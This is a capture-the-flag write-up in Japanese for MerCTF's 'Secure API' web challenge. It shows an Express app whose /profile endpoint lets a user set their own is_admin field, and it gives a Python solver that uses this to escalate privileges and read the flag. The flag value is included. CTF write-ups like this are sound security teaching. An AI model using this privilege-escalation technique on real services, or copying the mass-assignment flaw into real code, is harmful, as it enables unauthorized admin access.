# Secure API:MerCTF:450pts
I have built this secure API to manage users, can you check my security posture ?  
**URL:** [http://secure-api.merctf.com:3000/](http://secure-api.merctf.com:3000/)  

[app.js](app.js)  

# Solution
URLとソースが渡される。  
URLにアクセスしても何もない。  
```bash
$ curl 'http://secure-api.merctf.com:3000/'
Welcome
```
ソースを見ると以下のようであった。  
```js
~~~
app.get('',(req,res) => {
  return res.send('Welcome');
})


app.post('/login', (req, res) => {
  const { username, password } = req.body;
  connection.query('SELECT * FROM users WHERE username = ? LIMIT 1', [username], (err, rows) => {
    if (err) {
      return res.send({ error: err.message });
    }
    if (rows.length === 0) {
      return res.send({ error: 'Invalid username or password' });
    }
    
    const user = rows[0];
    bcrypt.compare(password, user.password, (err, result) => {
      if (err) {
        return res.send({ error: err.message });
      }
      if (!result) {
        return res.send({ error: 'Invalid username or password' });
      }
      
      const { id, username, is_admin } = user;
      req.session.loggedIn = true;
      req.session.user = { id, username, is_admin };
      res.send({ success: true, user: { id, username, is_admin } });
    });
  });
});

app.post('/register', (req, res) => {
  const { username, password, is_admin } = req.body;

  if (is_admin) {
    return res.send({ message: 'Hacking is not allowed. Please stop it.' });
  }

  const hashedPassword = bcrypt.hashSync(password, 10);
  connection.query('INSERT INTO users (username, password) VALUES (?, ?)', [username, hashedPassword], (err, result) => {
    if (err) {
      return res.send({ error: err.message });
    }
    const insertedUserId = result.insertId;
    connection.query('SELECT * FROM users WHERE id = ?', [insertedUserId], (err, rows) => {
      if (err) {
        return res.send({ error: err.message });
      }
      res.send(rows[0]);
    });
  });
});

app.post('/admin', (req, res) => {
  if (!req.session.loggedIn) {
    res.redirect('/?message=Please+login+first');
  } else {
    if (!req.session.user.is_admin) {
      return res.send({ error: 'You must be an admin to perform this action' });
    } else {
      const { id, is_admin } = req.body;
      connection.query('UPDATE users SET is_admin = ? WHERE id = ?', [is_admin, id], (err, result) => {
        if (err) {
          return res.send({ error: err.message });
        }
        const response = {
          success: true,
          affectedRows: result.affectedRows
        };
        res.send(response);
      });
    }
  }
});

app.get('/me', (req, res) => {
  if (!req.session.loggedIn) {
    res.redirect('/?message=Please+login+first');
  } else {
    if (!req.session.user.id) {
      return res.send({ error: 'User not found' });
    } else {
      const userId = req.session.user.id;
      connection.query('SELECT * FROM users WHERE id = ?', [userId], (err, rows) => {
        if (err) {
          return res.send({ error: err.message });
        }
        if (rows.length === 0) {
          return res.send({ error: 'User not found' });
        }
    
        res.send({
          user: {
            id: rows[0].id,
            username: rows[0].username,
            is_admin: rows[0].is_admin
          }
        });
      });
    }
  }
});

app.post('/profile', (req, res) => {
  if (!req.session.loggedIn) {
    res.redirect('/?message=Please+login+first');
  } else {
    if (!req.session.user.id) {
      return res.send({ error: 'You must be logged in to update your profile' });
    } else {
      const { username, password, is_admin = false } = req.body;
      let hashedPassword = null;
      if (password) {
        hashedPassword = bcrypt.hashSync(password, 10);
      }
      const userId = req.session.user.id;
      connection.query(
        'UPDATE users SET username = IFNULL(?, username), password = IFNULL(?, password), is_admin = IFNULL(?, is_admin) WHERE id = ?',
        [username, hashedPassword, is_admin, userId],
        (err, rows) => {
          if (err) {
            return res.send({ error: err.message });
          }
          req.session.user.username = username || req.session.user.username;
          res.send({ success: true });
        }
      );
    }
  }
});


app.post('/flag', (req, res) => {
  if (!req.session.loggedIn) {
    res.redirect('/?message=Please+login+first');
  } else {
    if (!req.session.user.is_admin) {
      return res.send({ error: 'You must be an admin to perform this action' });
    } else {
      fs.readFile('/flag', 'utf8', (err, data) => {
        if (err) {
          return res.send({ error: err.message });
        }
        res.send({ success: true, flag: data });
      });
    }
  }
});

app.get('/logout', (req, res) => {
  req.session.loggedIn = false;
  req.session.user = null;
  req.session.destroy((err) => {
    if (err) {
      return res.send({ error: err.message });
    }
    res.redirect('/');
  });
});
~~~
```
`/register`でユーザ登録し、`/login`でログインできる。  
`/flag`でフラグが表示されるようだが、`is_admin`がtrueである必要がある。  
`/register`で`is_admin`がfalseであることが確認されているので、ユーザ登録後に変更しなければならない。  
ちなみにSQLiなどは見つからない。  
ここでユーザからの入力を受け取り、DBを更新している個所を探すと以下が見つかる。  
```js
app.post('/profile', (req, res) => {
~~~
      const { username, password, is_admin = false } = req.body;
      let hashedPassword = null;
      if (password) {
        hashedPassword = bcrypt.hashSync(password, 10);
      }
      const userId = req.session.user.id;
      connection.query(
        'UPDATE users SET username = IFNULL(?, username), password = IFNULL(?, password), is_admin = IFNULL(?, is_admin) WHERE id = ?',
        [username, hashedPassword, is_admin, userId],
        (err, rows) => {
          if (err) {
            return res.send({ error: err.message });
          }
          req.session.user.username = username || req.session.user.username;
          res.send({ success: true });
        }
      );
~~~
});
```
ユーザから受け取った`is_admin`で値を更新してしまっている。  
これを用いて、`is_admin`をtrueにしてやればよい。  
```python
import requests

session = requests.Session()

username = "satoki00"
password = "password"

res = session.post("http://secure-api.merctf.com:3000/register", json={"username": username, "password": password})
print(f"[/register] {res.text}")

res = session.post("http://secure-api.merctf.com:3000/login", json={"username": username, "password": password})
print(f"[/login] {res.text}")

res = session.post("http://secure-api.merctf.com:3000/profile", json={"username": username, "password": password, "is_admin": 1})
print(f"[/profile] {res.text}")

res = session.post("http://secure-api.merctf.com:3000/login", json={"username": username, "password": password})
print(f"[/login] {res.text}")

res = session.post("http://secure-api.merctf.com:3000/flag")
print(f"[/flag] {res.text}")
```
実行する。  
```bash
$ python solver.py
[/register] {"id":33,"username":"satoki00","password":"$2b$10$MhvTSnw/L3jWVhJaGEm4R.7qKBqKTSE9zCZ.2z53hErsKOxoqLW7O","is_admin":0}
[/login] {"success":true,"user":{"id":33,"username":"satoki00","is_admin":0}}
[/profile] {"success":true}
[/login] {"success":true,"user":{"id":33,"username":"satoki00","is_admin":1}}
[/flag] {"success":true,"flag":"Merctf{N1c3_OnE_T1m3_T0_ThInK_AbOuT_JoInInG_MeRcAri}\n"}
```
flagが得られた。  

## Merctf{N1c3_OnE_T1m3_T0_ThInK_AbOuT_JoInInG_MeRcAri}